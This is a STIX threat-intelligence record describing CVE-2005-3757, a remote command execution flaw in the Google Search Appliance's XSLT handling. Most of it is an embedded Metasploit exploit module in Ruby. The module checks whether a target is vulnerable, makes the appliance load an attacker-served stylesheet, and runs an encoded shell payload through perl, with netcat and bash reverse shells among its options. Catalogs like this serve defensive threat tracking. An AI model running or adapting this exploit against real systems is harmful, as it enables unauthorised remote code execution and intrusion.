{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a7b010a-2c46-4d6c-818c-896b7e62d92b",
    "created": "2024-08-14T17:12:05.060869Z",
    "modified": "2024-08-14T17:12:05.060873Z",
    "name": "Google Appliance ProxyStyleSheet Command Execution",
    "description": " This module exploits a feature in the Saxon XSLT parser used by the Google Search Appliance. This feature allows for arbitrary java methods to be called. Google released a patch and advisory to their client base in August of 2005 (GA-2005-08-m). The target appliance must be able to connect back to your machine for this exploit to work. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/google_proxystylesheet_exec.rb",
            "external_id": "google_proxystylesheet_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-3757"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Google Appliance ProxyStyleSheet Command Execution',\n      'Description'    => %q{\n        This module exploits a feature in the Saxon XSLT parser used by\n      the Google Search Appliance. This feature allows for arbitrary\n      java methods to be called. Google released a patch and advisory to\n      their client base in August of 2005 (GA-2005-08-m). The target appliance\n      must be able to connect back to your machine for this exploit to work.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-3757'],\n          ['OSVDB', '20981'],\n          ['BID', '15509'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 4000,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl bash-tcp telnet netcat netcat-e',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2005-08-16',\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'DefaultTarget' => 0))\n  end\n\n  # Handle incoming requests from the appliance\n  def on_request_uri(cli, request)\n\n    print_status(\"Handling new incoming HTTP request...\")\n\n    exec_str = '/usr/bin/perl -e system(pack(qq{H*},qq{' + payload.encoded.unpack(\"H*\")[0] + '}))'\n    data = @xml_data.gsub(/:x:MSF:x:/, exec_str)\n    send_response(cli, data)\n  end\n\n  def autofilter\n    true\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'      => '/search',\n      'vars_get' =>\n      {\n        'client'          => rand_text_alpha(rand(15)+1),\n        'site'            => rand_text_alpha(rand(15)+1),\n        'output'          => 'xml_no_dtd',\n        'q'               => rand_text_alpha(rand(15)+1),\n        'proxystylesheet' => 'http://' + rand_text_alpha(rand(15)+1) + '/'\n      }\n    }, 10)\n\n    if (res and res.body =~ /cannot be resolved to an ip address/)\n      vprint_status(\"This system appears to be vulnerable\")\n      return Exploit::CheckCode::Appears\n    end\n\n    if (res and res.body =~ /ERROR: Unable to fetch the stylesheet/)\n      vprint_status(\"This system appears to be patched\")\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    # load the xml data\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"google_proxystylesheet.xml\")\n    fd = File.open(path, \"rb\")\n    @xml_data = fd.read(fd.stat.size)\n    fd.close\n\n    print_status(\"Obtaining the appliance site and client IDs...\")\n    # Send a HTTP/1.0 request to learn the site configuration\n    res = send_request_raw({\n      'uri'     => '/',\n      'version' => '1.0'\n    }, 10)\n\n    if !(res and res['location'] and res['location'] =~ /site=/)\n      print_status(\"Could not read the location header: #{res.code} #{res.message}\")\n      return\n    end\n\n    m = res['location'].match(/site=([^\\&]+)\\&.*client=([^\\&]+)\\&/im)\n    if !(m and m[1] and m[2])\n      print_status(\"Invalid location header: #{res['location']}\")\n      return\n    end\n\n    print_status(\"Starting up our web service on http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{resource_uri}...\")\n    start_service\n\n    print_status(\"Requesting a search using our custom XSLT...\")\n    res = send_request_cgi({\n      'uri'      => '/search',\n      'vars_get' =>\n      {\n        'client'          => m[2],\n        'site'            => m[1],\n        'output'          => 'xml_no_dtd',\n        'q'               => rand_text_alpha(rand(15)+1),\n        'proxystylesheet' => \"http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{resource_uri}/style.xml\",\n        'proxyreload'     => '1'\n      }\n    }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n      print_status(\"Waiting on the payload to execute...\")\n      select(nil,nil,nil,20)\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-16",
    "x_mitre_platforms": [
        "unix'"
    ]
}